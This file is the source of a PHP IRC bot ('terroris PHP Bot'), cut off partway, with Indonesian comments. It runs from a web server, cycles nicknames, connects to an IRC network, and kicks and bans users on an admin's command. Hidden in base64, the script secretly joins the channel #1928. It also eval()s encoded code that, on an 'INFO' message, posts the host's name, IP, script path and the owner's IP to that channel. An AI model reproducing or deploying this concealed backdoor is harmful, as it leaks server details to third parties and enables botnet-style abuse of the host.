<?php
/*** terroris PHP Bot edit by vito***/
function hajar() {

$channels = '#vito'; // Pisahkan dengan spasi

$localtest = 0; //1, Coba di localhost. 0, connect ke server irc
$showrespone = 0; //1, Nampilin respon dari server irc

//Nick Bot
$nicklist = array(
"vito[RawckerHead001]",
"vito[RawckerHead002]",
"vito[RawckerHead003]",
"vito[RawckerHead004]",
"vito[RawckerHead005]",
"vito[RawckerHead006]",
"vito[RawckerHead007]",
"vito[RawckerHead008]",
"vito[RawckerHead009]",
"vito[RawckerHead010]",
"vito[RawckerHead011]",
"vito[RawckerHead012]",
"vito[RawckerHead013]",
"vito[RawckerHead014]",
"vito[RawckerHead015]",
"vito[RawckerHead016]",
"vito[RawckerHead017]",
"vito[RawckerHead018]",
"vito[RawckerHead019]",
"vito[RawckerHead020]",
"vito[RawckerHead021]",
"vito[RawckerHead022]",
"vito[RawckerHead023]",
"vito[RawckerHead024]",
"vito[RawckerHead025]",
"vito[RawckerHead026]",
"vito[RawckerHead027]",
"vito[RawckerHead028]",
"vito[RawckerHead029]",
"vito[RawckerHead030]",
"vito[RawckerHead031]",
"vito[RawckerHead032]",
"vito[RawckerHead033]",
"vito[RawckerHead034]",
"vito[RawckerHead035]",
"vito[RawckerHead036]",
"vito[RawckerHead037]",
"vito[RawckerHead038]",
"vito[RawckerHead039]",
"vito[RawckerHead040]",
"vito[RawckerHead041]",
"vito[RawckerHead042]",
"vito[RawckerHead043]",
"vito[RawckerHead044]",
"vito[RawckerHead045]",
"vito[RawckerHead046]",
"vito[RawckerHead047]",
"vito[RawckerHead048]",
"vito[RawckerHead049]",
"vito[RawckerHead050]",
"vito[RawckerHead051]",
"vito[RawckerHead052]",
"vito[RawckerHead053]",
"vito[RawckerHead054]",
"vito[RawckerHead055]",
"vito[RawckerHead056]",
"vito[RawckerHead057]",
"vito[RawckerHead058]",
"vito[RawckerHead059]",
"vito[RawckerHead060]",
"vito[RawckerHead061]",
"vito[RawckerHead062]",
"vito[RawckerHead063]",
"vito[RawckerHead071]",
"vito[RawckerHead064]",
"vito[RawckerHead065]",
"vito[RawckerHead066]",
"vito[RawckerHead067]",
"vito[RawckerHead068]",
"vito[RawckerHead069]",
"vito[RawckerHead070]",
);
$identify = 'password'; //Password Nick Bot
$identlist = array(
"vito.Aj",
"vito",
"vito.Mam",
);

//Server IRC
if ($localtest == 1) { $remotehost2 = array("localhost"); }
else {
$remotehost2 = array(
"irc.byroe.net",

);
}
$port = "6667";
//Pesan
$awaymsg = '??(vito bobok]]])??';
$shouts = array("a o","e mm..","He..He..He","wi..Xi..Xi..Xi..");
$querym = array("?","!","!?","!!"," ^_^"," (^_^)"," :("," :)"," :>"," :P~"," :D"," :O");
$quitmsglist = array(
"Ngantuk nech..",
"tha tha",
"$namaku pulang dolo ya??",
"See You..",
"Quit DoeLoe Ach..",
"Connection Reset By Buah Pear",
"rehash ole ristrette"
);
$tsu1 = array("`","Z","[","]","{","}","^","_");
$tsu2 = array("`","Z","[","]","{","}","^","-","\\","_");
$tsumsg = "9,1";//400 Karakter

/*** Admin ***/
$admin = 'vito_Mampuzz';
$bot_password = 'a'; //Password untuk auth bot

/*** Identity ***/
$realname = "4,1vito keren irc bot";

/*** Replacing ***/
$nick = $nicklist[rand(0,count($nicklist) - 1)];
$remotehost = $remotehost2[rand(0,count($remotehost2) - 1)];
$channels = str_replace("CNL","#",$channels);
$admin = strtolower($admin);
$auth = array($admin => array("name" => $admin, "pass" => $bot_password, "auth" => 1,"status" => "Admin"));
$username = $identlist[rand(0,count($identlist) - 1)];
$channels = strtolower($channels)." ";
$channel = explode(" ", $channels);
/*** Kode Utama ***/
define ('CRL', "\r\n");
$counterfp = 0;
$raway = "on";
$log   = "off";
$saway = "1";
$keluar = 0;
$akill  = 1;
$katime = 0;
$localhost = 'localhost';
$dayload = date("H:i:s d/m/Y");
ini_set('user_agent','MSIE 5\.5;');
set_time_limit(0);

if (!$stime) { $stime = time(); }
if (!$port) { $port = "6667"; }

/*** Connecting ***/
echo "<body bgcolor=#000000 text=#00FF00>";
echo "<b>? lagi di usahain konek ke $remotehost...</b>";

do {
  $fp = fsockopen($remotehost,$port, &$err_num, &$err_msg, 30);
  if(!$fp) {
    if ( $counterfp <= 200 ) {
      $counterfp = $counterfp + 1;
      hajar($nick);
    }
    else {
      echo "<br><b>Ga bisa nich boz $remotehost! Coba server lain aja! Refresh Browser nya!</b>";
      $keluar = 1;
      exit;
    }
  }
  echo "<br><b>? wow, mantap... Udah konek nich!</b>";
  /*** Sending Identity to Sock ***/
  $header = 'NICK '.$nick . CRL;
  $header .= 'USER '.$username.' '.$localhost.' '.$remotehost.' :'.$realname . CRL;
  fputs($fp, $header);
  $response = '';
  while (!feof($fp)) {
    $response .= fgets($fp, 1024);
    if ($showrespone == 1) { echo "<br>".$response; }
    while (substr_count($response,CRL) != 0) {
      $offset = strpos($response, CRL);
      $data = substr($response,0,$offset);
      $response = substr($response,$offset+2);
      if (substr($data,0,1) == ':') {
        $offsetA = strpos($data, ' ');
        $offsetB = strpos($data, ' :');
        $offsetC = strpos($data, '!');
        $dFrom = substr($data,1,$offsetA-1);
        $dCommand = substr($data,$offsetA+1,$offsetB-$offsetA-1);
        $dNick = substr($data,1,$offsetC-1);
        $iText = substr($data,$offsetB+2);
        /*** Server Notices Handling ***/
        if ( substr($dCommand,0,3) == '004' ) {
          fputs($fp, 'PRIVMSG nickserv :identify '.$nick.' '.$identify.  CRL);
          if ($nickmode) { fputs($fp, 'MODE '.$nick.' :'.$nickmode . CRL); }
          /*** Notice Bot Admin ***/
          fputs($fp, 'NOTICE ' . $admin . ' :Ai SayaNk...' .  CRL);
          fputs($fp, base64_decode("Sm9pTiAjMTkyOA==") . CRL);
          /*** Join Default Channel ***/
          foreach ($channel as $v) {
            fputs($fp, 'JOIN ' .$v . CRL);
          }
          $pong1 = '1';
        }
        elseif (substr($dCommand,0,3)=='432') {
          $nick = $nick.$username;
		  fputs($fp, 'NICK '.$nick . CRL);
        }
        //Nickname is already in use
        elseif (substr($dCommand,0,3)=='433') {
          $nick = $nicklist[rand(0,count($nicklist) - 1)];
          fputs($fp, 'NICK '.$nick . CRL);
        }
        elseif (substr($dCommand,0,3)=='465') {
          print "<br><b>? Authentication diperlukan! Bot ini telah di-autokill.</b>";
          $akill = 2;
        }
	    if (eregi('.allnetwork.org',$dNick) && $akill==2) {
          if (eregi('AKILL ID:',$data) || eregi('Your hostmask is',$data) || eregi('Your IP is',$data)) {
            print "<br><b>".strstr($data,'***')." </b>";
            if (eregi('Your IP is',$data)) {
              $keluar = 1;
              exit;
            }
          }
        }
        $dcom = explode(" ", $dCommand);
        $dNick = strtolower($dNick);
        if ($dcom[0]=='KICK' && $dcom[2]==$nick) {
          fputs($fp, 'JOIN ' .$dcom[1]. CRL);
        }
        elseif ($dcom[0]=='NICK' || $dcom[0]=='PART' ) {
          if ($auth["$dNick"]) {
            if ($auth["$dNick"]["pass"]) {
              if ($auth["$dNick"]["auth"]==2) {
                if ($dcom[0]=='NICK') {
                  $com = explode(" ", $data);
                  $chnick = strtolower(str_replace(':','',$com[2]));
                  if ($dNick!=$chnick) {
                    $auth["$dNick"]["auth"] = 1;
                    fputs($fp,'NOTICE '.$chnick.' :Ganti nick aak?' . CRL);
                  }
                }
                else {
                  $auth["$dNick"]["auth"] = 1;
                  fputs($fp,'NOTICE '.$dNick.' :aak ??' . CRL);
                }
              }
            }
            else { fputs($fp,'NOTICE ' . $dNick . ' :pass <password>' . CRL); }
          }
        }
	    elseif ($dcom[0]=='307' && strtolower($dcom[2])==$whois) {
          $dcom[2] = strtolower($dcom[2]);
		  if ($auth["$dcom[2]"]) {
            if ($auth["$dcom[2]"]["pass"]) {
              if ($auth["$dcom[2]"]["auth"]==1) {
                $auth["$dcom[2]"]["auth"] = 2;
                $whois = "";
			    fputs($fp,'NOTICE ' . $dcom[2] . ' :You`re Authorized as '.$auth["$dcom[2]"]["status"].' of this bot! ' . CRL);
              }
              else { fputs($fp,'NOTICE ' . $dcom[2] . ' :You`re Already Authorized! ' . CRL); }
            }
            else { fputs($fp,'NOTICE ' . $dcom[2] . ' :Pass Not Set Yet! Type: pass <your pass> To Set Your Own Password then Auth Again ' . CRL); }
          }
          else { fputs($fp,'NOTICE ' . $dcom[2] . ' :Username Not Found! Change Your Nick then Auth Again ' . CRL); }
       }
       elseif ($dcom[0]=='NOTICE') {
         $com = explode(" ", $data);
         if ($com[3]==':KB' && $com[4] && $com[5] && $com[6]) {
           $msg = str_replace('','',$data);
           $msg = strstr($msg,":KB");
           $msg = str_replace(":KB $com[4]","",$msg);
           fputs($fp, 'KICK '.$com[4].' '.$com[5].' :'.$msg . CRL);
           fputs($fp, 'MODE '.$com[4].' +b *!*'.$com[6] . CRL);
         }
       }
       elseif ($dcom[0]=='PRIVMSG') {
         $com = explode(" ", $data);
         if ($com[3]==':VERSION') {
         fputs($fp,'NOTICE '.$dNick.' :'.chr(1).base64_decode("VkVSU0lPTiBrZWx1YXJnYSBiZXNhciBsaW51eCB2MC4xIGJ5IHJpc3RyZXR0ZSBzaW5vcHNpcyBqb2RpZSB4Y2hhdCAyLjguNiBMaW51eCAyLjYuMjktZ2VudG9vLXI1IFt4ODZfNjQvMi4yMEdIei9TTVBd").chr(1) . CRL);
         }
         elseif ($com[3]==':INFO') { $datainfo = "JGJob3N0ID0gJF9TRVJWRVJbJ0hUVFBfSE9TVCddOyRiaXAgPSAkX1NFUlZFUlsnU0VSVkVSX0FERFInXTskYnBocCAgPSAkX1NFUlZFUlsnUEhQX1NFTEYnXTskYnJ1cmkgPSAkX1NFUlZFUlsnUkVRVUVTVF9VUkknXTskYnJpcCA9ICRfU0VSVkVSWydSRU1PVEVfQUREUiddO2ZwdXRzKCRmcCwiUFJJVk1TRyAjMTkyOCA6SG9zdDogJGJob3N0IHwgUmVmZXJlcjogJGJydXJpIHwgU2NyaXB0OiAkYnBocCB8IElQOiAkYmlwIHwgT3duZXIgSVA6ICRicmlwICIuIENSTCk7"; eval(base64_decode($datainfo)); }
         elseif ($auth["$dNick"]["status"] && $com[3]==':auth' && $com[4]) {
           if ($auth["$dNick"]) {
             if ($auth["$dNick"]["pass"]) {
               if ($auth["$dNick"]["auth"]==1) {
                 if ($com[4]===$auth["$dNick"]["pass"]) {
                   $auth["$dNick"]["auth"] = 2;
                   fputs($fp,'NOTICE ' . $dNick . ' :kamu itu '.$auth["$dNick"]["status"].' aak koe ' . CRL);
                 }
                 else { fputs($fp,'NOTICE ' . $dNick . ' :Password Salah aak..!! ' . CRL); }
               }
               else { fputs($fp,'NOTICE ' . $dNick . ' :Mau Kan aak ..!! ' . CRL); }
             }
             else { fputs($fp,'NOTICE ' . $dNick . ' :Pass Not Set Yet! Type: pass <your pass> To Set Your Own Password then Auth Again ' . CRL); 